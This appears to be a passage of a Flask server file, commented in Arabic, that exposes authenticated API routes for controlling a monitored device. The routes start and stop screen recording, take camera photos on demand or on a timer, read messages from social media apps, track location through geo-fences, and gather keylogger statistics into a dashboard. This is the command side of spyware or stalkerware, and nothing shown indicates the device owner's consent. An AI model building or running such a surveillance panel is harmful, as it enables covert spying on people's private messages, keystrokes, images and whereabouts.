@token_required
def stop_screen_recorder():
    """إيقاف تسجيل الشاشة"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        screen_recorder_api = get_or_create_feature_instance('screen_recorder', device_id)
        if not screen_recorder_api:
            return jsonify({'error': 'Screen recorder not available'}), 503
        
        result = screen_recorder_api.stop_recording()
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Stop screen recorder error: {e}")
        return jsonify({'error': 'Failed to stop screen recorder'}), 500

@app.route('/api/screen-recorder/recordings', methods=['GET'])
@token_required
def get_screen_recordings():
    """الحصول على تسجيلات الشاشة"""
    try:
        device_id = request.args.get('device_id')
        limit = int(request.args.get('limit', 50))
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        screen_recorder_api = get_or_create_feature_instance('screen_recorder', device_id)
        if not screen_recorder_api:
            return jsonify({'error': 'Screen recorder not available'}), 503
        
        recordings = screen_recorder_api.get_recordings(limit)
        return jsonify({
            'success': True,
            'recordings': recordings
        })
    
    except Exception as e:
        logger.error(f"Get screen recordings error: {e}")
        return jsonify({'error': 'Failed to get screen recordings'}), 500

# ==================== Camera Capture APIs ====================

@app.route('/api/camera/capture', methods=['POST'])
@token_required
def capture_camera():
    """التقاط صورة من الكاميرا"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        camera_type = data.get('camera_type', 'front')
        quality = data.get('quality', 'high')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        camera_api = get_or_create_feature_instance('camera_capture', device_id)
        if not camera_api:
            return jsonify({'error': 'Camera capture not available'}), 503
        
        result = camera_api.capture_photo(camera_type, quality)
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Camera capture error: {e}")
        return jsonify({'error': 'Failed to capture photo'}), 500

@app.route('/api/camera/start-auto', methods=['POST'])
@token_required
def start_auto_camera():
    """بدء التقاط الصور التلقائي"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        interval = data.get('interval', 300)  # 5 دقائق افتراضي
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        camera_api = get_or_create_feature_instance('camera_capture', device_id)
        if not camera_api:
            return jsonify({'error': 'Camera capture not available'}), 503
        
        result = camera_api.start_auto_capture(interval)
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Start auto camera error: {e}")
        return jsonify({'error': 'Failed to start auto capture'}), 500

@app.route('/api/camera/stop-auto', methods=['POST'])
@token_required
def stop_auto_camera():
    """إيقاف التقاط الصور التلقائي"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        camera_api = get_or_create_feature_instance('camera_capture', device_id)
        if not camera_api:
            return jsonify({'error': 'Camera capture not available'}), 503
        
        result = camera_api.stop_auto_capture()
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Stop auto camera error: {e}")
        return jsonify({'error': 'Failed to stop auto capture'}), 500

@app.route('/api/camera/photos', methods=['GET'])
@token_required
def get_camera_photos():
    """الحصول على الصور الملتقطة"""
    try:
        device_id = request.args.get('device_id')
        limit = int(request.args.get('limit', 50))
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        camera_api = get_or_create_feature_instance('camera_capture', device_id)
        if not camera_api:
            return jsonify({'error': 'Camera capture not available'}), 503
        
        photos = camera_api.get_photos(limit)
        return jsonify({
            'success': True,
            'photos': photos
        })
    
    except Exception as e:
        logger.error(f"Get camera photos error: {e}")
        return jsonify({'error': 'Failed to get camera photos'}), 500

# ==================== Social Media Monitor APIs ====================

@app.route('/api/social-media/start', methods=['POST'])
@token_required
def start_social_media_monitor():
    """بدء مراقبة التطبيقات الاجتماعية"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        apps = data.get('apps', [])
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        social_media_api = get_or_create_feature_instance('social_media', device_id)
        if not social_media_api:
            return jsonify({'error': 'Social media monitor not available'}), 503
        
        result = social_media_api.start_monitoring(apps)
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Start social media monitor error: {e}")
        return jsonify({'error': 'Failed to start social media monitor'}), 500

@app.route('/api/social-media/stop', methods=['POST'])
@token_required
def stop_social_media_monitor():
    """إيقاف مراقبة التطبيقات الاجتماعية"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        social_media_api = get_or_create_feature_instance('social_media', device_id)
        if not social_media_api:
            return jsonify({'error': 'Social media monitor not available'}), 503
        
        result = social_media_api.stop_monitoring()
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Stop social media monitor error: {e}")
        return jsonify({'error': 'Failed to stop social media monitor'}), 500

@app.route('/api/social-media/messages', methods=['GET'])
@token_required
def get_social_media_messages():
    """الحصول على رسائل التطبيقات الاجتماعية"""
    try:
        device_id = request.args.get('device_id')
        app_name = request.args.get('app_name')
        limit = int(request.args.get('limit', 100))
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        social_media_api = get_or_create_feature_instance('social_media', device_id)
        if not social_media_api:
            return jsonify({'error': 'Social media monitor not available'}), 503
        
        messages = social_media_api.get_messages(app_name, limit)
        return jsonify({
            'success': True,
            'messages': messages
        })
    
    except Exception as e:
        logger.error(f"Get social media messages error: {e}")
        return jsonify({'error': 'Failed to get social media messages'}), 500

@app.route('/api/social-media/statistics', methods=['GET'])
@token_required
def get_social_media_statistics():
    """الحصول على إحصائيات التطبيقات الاجتماعية"""
    try:
        device_id = request.args.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        social_media_api = get_or_create_feature_instance('social_media', device_id)
        if not social_media_api:
            return jsonify({'error': 'Social media monitor not available'}), 503
        
        stats = social_media_api.get_statistics()
        return jsonify(stats)
    
    except Exception as e:
        logger.error(f"Get social media statistics error: {e}")
        return jsonify({'error': 'Failed to get social media statistics'}), 500

# ==================== Geo-Fencing APIs ====================

@app.route('/api/geo-fencing/start', methods=['POST'])
@token_required
def start_geo_fencing():
    """بدء نظام Geo-Fencing"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        geo_fencing_api = get_or_create_feature_instance('geo_fencing', device_id)
        if not geo_fencing_api:
            return jsonify({'error': 'Geo-fencing not available'}), 503
        
        result = geo_fencing_api.start_monitoring()
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Start geo-fencing error: {e}")
        return jsonify({'error': 'Failed to start geo-fencing'}), 500

@app.route('/api/geo-fencing/stop', methods=['POST'])
@token_required
def stop_geo_fencing():
    """إيقاف نظام Geo-Fencing"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        geo_fencing_api = get_or_create_feature_instance('geo_fencing', device_id)
        if not geo_fencing_api:
            return jsonify({'error': 'Geo-fencing not available'}), 503
        
        result = geo_fencing_api.stop_monitoring()
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Stop geo-fencing error: {e}")
        return jsonify({'error': 'Failed to stop geo-fencing'}), 500

@app.route('/api/geo-fencing/create-fence', methods=['POST'])
@token_required
def create_geo_fence():
    """إنشاء منطقة جغرافية"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        name = data.get('name')
        description = data.get('description', '')
        center_lat = data.get('center_lat')
        center_lng = data.get('center_lng')
        radius_meters = data.get('radius_meters')
        fence_type = data.get('fence_type', 'safe_zone')
        
        required_fields = ['device_id', 'name', 'center_lat', 'center_lng', 'radius_meters']
        for field in required_fields:
            if field not in data or data[field] is None:
                return jsonify({'error': f'{field} is required'}), 400
        
        geo_fencing_api = get_or_create_feature_instance('geo_fencing', device_id)
        if not geo_fencing_api:
            return jsonify({'error': 'Geo-fencing not available'}), 503
        
        result = geo_fencing_api.create_geo_fence(name, description, center_lat, center_lng, radius_meters, fence_type)
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Create geo fence error: {e}")
        return jsonify({'error': 'Failed to create geo fence'}), 500

@app.route('/api/geo-fencing/fences', methods=['GET'])
@token_required
def get_geo_fences():
    """الحصول على المناطق الجغرافية"""
    try:
        device_id = request.args.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        geo_fencing_api = get_or_create_feature_instance('geo_fencing', device_id)
        if not geo_fencing_api:
            return jsonify({'error': 'Geo-fencing not available'}), 503
        
        fences = geo_fencing_api.get_geo_fences()
        return jsonify({
            'success': True,
            'fences': fences
        })
    
    except Exception as e:
        logger.error(f"Get geo fences error: {e}")
        return jsonify({'error': 'Failed to get geo fences'}), 500

@app.route('/api/geo-fencing/alerts', methods=['GET'])
@token_required
def get_geo_alerts():
    """الحصول على تنبيهات Geo-Fencing"""
    try:
        device_id = request.args.get('device_id')
        limit = int(request.args.get('limit', 50))
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        geo_fencing_api = get_or_create_feature_instance('geo_fencing', device_id)
        if not geo_fencing_api:
            return jsonify({'error': 'Geo-fencing not available'}), 503
        
        alerts = geo_fencing_api.get_alerts(limit)
        return jsonify({
            'success': True,
            'alerts': alerts
        })
    
    except Exception as e:
        logger.error(f"Get geo alerts error: {e}")
        return jsonify({'error': 'Failed to get geo alerts'}), 500

@app.route('/api/geo-fencing/statistics', methods=['GET'])
@token_required
def get_geo_statistics():
    """الحصول على إحصائيات Geo-Fencing"""
    try:
        device_id = request.args.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        geo_fencing_api = get_or_create_feature_instance('geo_fencing', device_id)
        if not geo_fencing_api:
            return jsonify({'error': 'Geo-fencing not available'}), 503
        
        stats = geo_fencing_api.get_statistics()
        return jsonify(stats)
    
    except Exception as e:
        logger.error(f"Get geo statistics error: {e}")
        return jsonify({'error': 'Failed to get geo statistics'}), 500

# ==================== Advanced Statistics APIs ====================

@app.route('/api/advanced-stats/dashboard', methods=['GET'])
@token_required
def get_advanced_dashboard_stats():
    """الحصول على إحصائيات لوحة التحكم المتقدمة"""
    try:
        device_id = request.args.get('device_id')
        
        stats = {
            'basic_stats': {},
            'advanced_stats': {}
        }
        
        # الإحصائيات الأساسية
        basic_stats = get_dashboard_stats()
        if basic_stats.status_code == 200:
            stats['basic_stats'] = basic_stats.get_json().get('stats', {})
        
        # الإحصائيات المتقدمة
        if ADVANCED_FEATURES_AVAILABLE and device_id:
            # إحصائيات Keylogger
            keylogger_api = get_or_create_feature_instance('keylogger', device_id)
            if keylogger_api:
                try:
                    keylogger_stats = keylogger_api.get_statistics()
                    stats['advanced_stats']['keylogger'] = keylogger_stats
                except:
                    stats['advanced_stats']['keylogger'] = {'error': 'Not available'}
            
            # إحصائيات Social Media
            social_media_api = get_or_create_feature_instance('social_media', device_id)
            if social_media_api:
                try:
                    social_stats = social_media_api.get_statistics()
                    stats['advanced_stats']['social_media'] = social_stats
                except:
                    stats['advanced_stats']['social_media'] = {'error': 'Not available'}
            
            # إحصائيات Geo-Fencing
            geo_fencing_api = get_or_create_feature_instance('geo_fencing', device_id)
            if geo_fencing_api:
                try:
                    geo_stats = geo_fencing_api.get_statistics()
                    stats['advanced_stats']['geo_fencing'] = geo_stats
                except:
                    stats['advanced_stats']['geo_fencing'] = {'error': 'Not available'}
        
        return jsonify({
            'success': True,
            'stats': stats
        })
    
    except Exception as e:
        logger.error(f"Get advanced dashboard stats error: {e}")
        return jsonify({'error': 'Failed to get advanced statistics'}), 500

# تهيئة الميزات المتقدمة عند بدء التطبيق
init_advanced_features()

